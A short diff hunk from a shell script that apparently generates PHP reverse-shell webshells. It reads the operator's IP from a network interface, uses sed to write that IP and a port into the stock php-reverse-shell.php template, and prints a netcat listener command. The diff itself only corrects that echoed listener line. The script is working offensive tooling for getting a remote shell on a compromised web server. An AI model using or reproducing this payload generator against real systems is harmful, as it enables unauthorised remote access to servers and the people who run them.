@@ -14,5 +14,5 @@ else
 
 	LHOST=$(ifconfig "$1" | grep -win 'inet' | cut -d " " -f 10)
 	sed -e "s/127.0.0.1/$LHOST/g" -e "s/1234/$port/g" /usr/share/webshells/php/php-reverse-shell.php > $file_name
-	echo "netcat -nlvp $LHOST $port"
+	echo "netcat -nlvp $port"
 fi
